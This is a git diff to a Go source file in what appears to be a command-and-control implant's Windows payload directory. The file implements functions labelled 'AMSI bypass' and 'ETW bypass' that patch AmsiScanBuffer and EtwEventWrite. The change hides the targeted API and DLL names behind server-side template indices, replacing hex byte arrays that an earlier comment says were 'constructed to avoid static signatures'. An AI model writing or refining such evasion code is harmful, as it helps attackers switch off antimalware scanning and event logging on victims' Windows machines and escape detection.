@@ -1,4 +1,4 @@
-// server/docker/payloads/SMB_Windows/patches.go
+// server/docker/payloads/TCP_Windows/patches.go
 //go:build windows
 // +build windows
 
@@ -6,35 +6,66 @@ package main
 
 import (
 	"fmt"
+	"sync"
 	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-// Patches strings (constructed to avoid static signatures)
-var (
-	patchNtdllDLL              = string([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c})                                                                                     // ntdll.dll
-	patchAmsiDLL               = string([]byte{0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c})                                                                                           // amsi.dll
-	patchAmsiScanBuffer        = string([]byte{0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72})                                                       // AmsiScanBuffer
-	patchEtwEventWrite         = string([]byte{0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65})                                                             // EtwEventWrite
-	patchVirtualProtect        = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74})                                                       // VirtualProtect
-	patchGetCurrentProcess     = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                     // GetCurrentProcess
-	patchNtProtectVirtualMem   = string([]byte{0x4e, 0x74, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79})       // NtProtectVirtualMemory
+// Template indices for patches strings - must match server's common.go
+const (
+	// Existing COFF indices we can reuse
+	idxPatchDllNtdll           = 871 // ntdll.dll (IdxCoffDllNtdll)
+	idxPatchApiVirtualProtect  = 887 // VirtualProtect (IdxCoffApiVirtualProtect)
+	idxPatchApiGetCurrentProc  = 889 // GetCurrentProcess (IdxCoffApiGetCurrentProcess)
+
+	// New patches-specific indices
+	idxPatchAmsiDll          = 1010 // amsi.dll
+	idxPatchAmsiScanBuffer   = 1011 // AmsiScanBuffer
+	idxPatchEtwEventWrite    = 1012 // EtwEventWrite
+	idxPatchNtProtectVirtMem = 1013 // NtProtectVirtualMemory
 )
 
-var (
-	ntdllDLL = syscall.NewLazyDLL(patchNtdllDLL)
+// patchTpl retrieves template strings from BOF template
+func patchTpl(idx int) string {
+	return bofTpl(idx)
+}
 
-	virtualProtect         = kernel32DLL.NewProc(patchVirtualProtect)
-	getCurrentProcess      = kernel32DLL.NewProc(patchGetCurrentProcess)
-	ntProtectVirtualMemory = ntdllDLL.NewProc(patchNtProtectVirtualMem)
+// Convenience functions for patches strings
+func patchDllNtdll() string           { return patchTpl(idxPatchDllNtdll) }
+func patchDllAmsi() string            { return patchTpl(idxPatchAmsiDll) }
+func patchApiAmsiScanBuffer() string  { return patchTpl(idxPatchAmsiScanBuffer) }
+func patchApiEtwEventWrite() string   { return patchTpl(idxPatchEtwEventWrite) }
+func patchApiVirtualProtect() string  { return patchTpl(idxPatchApiVirtualProtect) }
+func patchApiGetCurrentProcess() string { return patchTpl(idxPatchApiGetCurrentProc) }
+func patchApiNtProtectVirtMem() string { return patchTpl(idxPatchNtProtectVirtMem) }
+
+// Lazy DLL initialization
+var (
+	patchDllInitOnce sync.Once
+	patchNtdllDLL    *syscall.LazyDLL
+
+	virtualProtect         *syscall.LazyProc
+	getCurrentProcess      *syscall.LazyProc
+	ntProtectVirtualMemory *syscall.LazyProc
 )
+
+// initPatchDlls initializes DLLs lazily after templates are available
+func initPatchDlls() {
+	patchDllInitOnce.Do(func() {
+		patchNtdllDLL = syscall.NewLazyDLL(patchDllNtdll())
+
+		virtualProtect = kernel32DLL.NewProc(patchApiVirtualProtect())
+		getCurrentProcess = kernel32DLL.NewProc(patchApiGetCurrentProcess())
+		ntProtectVirtualMemory = patchNtdllDLL.NewProc(patchApiNtProtectVirtMem())
+	})
+}
 
 // AMSI bypass
 func patchAMSI() error {
-	amsi := windows.NewLazySystemDLL(patchAmsiDLL)
-	amsiScanBuffer := amsi.NewProc(patchAmsiScanBuffer)
+	amsi := windows.NewLazySystemDLL(patchDllAmsi())
+	amsiScanBuffer := amsi.NewProc(patchApiAmsiScanBuffer())
 
 	if amsiScanBuffer.Addr() == 0 {
 		return fmt.Errorf(Err(E4))
@@ -52,8 +83,8 @@ func patchAMSI() error {
 
 // ETW bypass
 func patchETW() error {
-	ntdll := windows.NewLazySystemDLL(patchNtdllDLL)
-	etwEventWrite := ntdll.NewProc(patchEtwEventWrite)
+	ntdll := windows.NewLazySystemDLL(patchDllNtdll())
+	etwEventWrite := ntdll.NewProc(patchApiEtwEventWrite())
 
 	if etwEventWrite.Addr() == 0 {
 		return fmt.Errorf(Err(E4))
